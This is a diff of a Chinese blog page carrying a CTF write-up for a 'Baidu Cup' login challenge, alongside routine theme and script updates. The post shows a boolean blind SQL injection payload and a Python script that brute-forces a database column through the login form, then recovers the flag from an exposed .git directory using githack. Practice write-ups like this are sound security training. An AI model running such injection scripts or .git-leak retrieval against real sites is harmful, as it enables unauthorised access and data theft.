@@ -9,7 +9,8 @@
     
     <meta name="keywords" content=".git泄露,sql注入">
     <link rel="shortcut icon" href="/img/favicon.ico">
-    <link rel="stylesheet" href="/css/style.css?v=1.3.1">
+    <link rel="stylesheet" href="/css/third-party/swipebox.min.css?v=1.3.2">
+    <link rel="stylesheet" href="/css/style.css?v=1.3.2">
     
     <script type="text/javascript">
         // Data Center
@@ -25,7 +26,7 @@
         window.lazyScripts=[];
     </script>
     
-        <script type="text/javascript" src="/js/plugins/daovoice.js?v=1.3.1"></script>
+        <script type="text/javascript" src="/js/plugins/daovoice.js?v=1.3.2"></script>
     
 </head>
 
@@ -228,24 +229,24 @@
         <div class="post-content" id="post-content" itemprop="postContent">
             
             <p>打开页面是一个登陆框:<br><figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/31511072.jpg" alt="" title="" class="">
+                <a rel=“百度杯”CTF比赛 登陆 writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/31511072.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/31511072.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure></p>
 <p>查看源代码：<br><figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/74624348.jpg" alt="" title="" class="">
+                <a rel=“百度杯”CTF比赛 登陆 writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/74624348.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/74624348.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure></p>
 <p>什么都发现不了，<br>但是这个表单中用户名密码的<code>class</code>有点奇怪，先记着</p>
 <p>随便输入用户名和密码<br>同时打开burpsuite抓包：<br><figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/49866720.jpg" alt="" title="" class="">
+                <a rel=“百度杯”CTF比赛 登陆 writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/49866720.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/49866720.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure></p>
 <p>用万能密码试试：<br><figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/81470936.jpg" alt="" title="" class="">
+                <a rel=“百度杯”CTF比赛 登陆 writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/81470936.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/81470936.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure></p>
 <p>提示密码错误，但是当提交<code>or &#39;1&#39; = &#39;2</code>时，显示的是：<br><figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/31785022.jpg" alt="" title="" class="">
+                <a rel=“百度杯”CTF比赛 登陆 writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/31785022.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/31785022.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure></p>
 <p>猜测是个布尔型的盲注</p>
@@ -253,23 +254,23 @@
 <p>import string<br>import requests</p>
 <p>url = ‘<a href="http://6990a7a5194048468ddd58ba76d76945610fd134a3ad4269.game.ichunqiu.com/Challenges/login.php&#39;" target="_blank" rel="noopener">http://6990a7a5194048468ddd58ba76d76945610fd134a3ad4269.game.ichunqiu.com/Challenges/login.php&#39;</a><br>headers = {‘User-Agent’: “Mozilla/5.0 (X11; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0”}<br>payloads = string.ascii_letters + string.digits<br>temp = ‘’<br>for i in range(40):<br>    print(“the”+str(i)+”one”)<br>    for p in payloads:<br>        payload = temp + p<br>        name = “admin’ or user_n3me like ‘{}%’ ;#”.format(payload)<br>        data = dict(username=name, passwrod=’test’)<br>        res = requests.post(url, headers=headers, data=data)<br>        if (len(res.content) == 12):<br>            temp = temp + p<br>            print(temp.ljust(32, ‘.’))<br>            break<br><code>`</code><br>换url和列名就行。</p>
 <p>登陆进去之后是这个页面：<br><figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/83153689.jpg" alt="" title="" class="">
+                <a rel=“百度杯”CTF比赛 登陆 writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/83153689.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/83153689.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure></p>
 <p>那个.bctfg1t看起来像个.git文件，试了一下：<br><figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/205237.jpg" alt="" title="" class="">
+                <a rel=“百度杯”CTF比赛 登陆 writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/205237.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/205237.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure></p>
 <p>果然是个.git文件，githack跑完之后：<br><figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/25792402.jpg" alt="" title="" class="">
+                <a rel=“百度杯”CTF比赛 登陆 writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/25792402.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/25792402.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure></p>
 <p>接下来很明显就是还原版本了，<br><code>git cat-file -p 哈希</code><br>一直到a1开头的哈希：<br><figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/74666070.jpg" alt="" title="" class="">
+                <a rel=“百度杯”CTF比赛 登陆 writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/74666070.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/74666070.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure></p>
 <p>出来一个文件名,我们访问他：<br>得到flag：<br><figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/79811599.jpg" alt="" title="" class="">
+                <a rel=“百度杯”CTF比赛 登陆 writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/79811599.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/79811599.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure></p>
 
@@ -406,6 +407,21 @@
             
             
             
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
         </p>
     </div>
 </footer>
@@ -468,21 +484,33 @@
 
     
     <!-- main-js -->
-<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
-<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.3.1"></script>
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.3.2"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.3.2"></script>
+<script type="text/javascript" src="/js/plugins/jquery.swipebox.min.js?v=1.3.2"></script>
 
 <script type="text/javascript" src="https://cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
 
-<script type="text/javascript" src="/js/method.js?v=1.3.1"></script>
-<script type="text/javascript" src="/js/blog.js?v=1.3.1"></script>
+<script type="text/javascript" src="/js/method.js?v=1.3.2"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.3.2"></script>
 
 <!-- third-party -->
+<script type="text/javascript">
+;( function( $ ) {
+
+	$( '.swipebox' ).swipebox({
+		hideCloseButtonOnMobile: true
+	});
+
+} )( jQuery );
+</script>
 
 
 
 
 
-<script type="text/javascript" src="/js/plugins/local_search.js?v=1.3.1"></script>
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.3.2"></script>
 <script type="text/javascript">
 	var search_path = "search.xml";
 	if (search_path.length === 0) {
@@ -494,17 +522,21 @@
 
 
 
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
     
         <script type="text/javascript" src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
 <script type="text/javascript" src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script type="text/javascript" src="/js/plugins/valine.js?v=1.3.1"></script>
+<script type="text/javascript" src="/js/plugins/valine.js?v=1.3.2"></script>
     
     
 
 
 
 <script type="text/javascript" src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
-<script type="text/javascript" src="/js/plugins/leancloud_visitors.js?v=1.3.1"></script>
+<script type="text/javascript" src="/js/plugins/leancloud_visitors.js?v=1.3.2"></script>
 
 
 
@@ -543,5 +575,5 @@
 </script>
 
     
-</body>
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/hijiki.model.json"},"display":{"position":"right","width":120,"height":240},"mobile":{"show":true},"log":false});</script></body>
 </html>
